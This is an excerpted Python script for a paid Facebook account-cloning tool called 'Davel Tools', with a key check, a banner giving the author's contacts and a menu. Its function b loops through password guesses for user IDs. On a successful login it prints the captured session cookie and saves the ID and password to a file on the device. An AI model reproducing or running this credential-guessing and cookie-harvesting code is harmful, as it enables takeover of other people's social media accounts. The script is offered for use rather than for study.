...
a=requests.get("https://github.com/4KING1/Sumon-ap/blob/main/Aprubal.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/mdshimul.sha.98')
    exit()
  
logo=(""" 
    \033[1;31m ____  ___ _    __________ 
   \033[1;34m / __ \/   | |  / / ____/ / 
  \033[1;33m / / / / /| | | / / __/ / /  
 \033[1;32m / /_/ / ___ | |/ / /___/ /___
\033[1;37m /_____/_/  |_|___/_____/_____/
                              
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m Welcome to my Davel Tools              \033[0;m  \33[1;92m║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  PAID  RANDOM CLONING V1.1 \033[0;m           \33[1;92m   ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║➣\033[1;91m DEVOLPER   :          Md Shimul sha \33[1;92m      ║               
\33[1;92m║➣ FACEBOOK   :          Md Shimul Sha       \33[1;92m║                 
\33[1;92m║➣\033[1;93m WHATSAPP   :          01725280174        \33[1;92m ║
\33[1;92m║➣\033[1;34m GITHUB     :          4King1             \33[1;92m ║          
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/mdshimul.sha.98');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801725280174');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mDAVEL-6T9\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [DAVEL-6T9-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/DAVEL-6T9ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
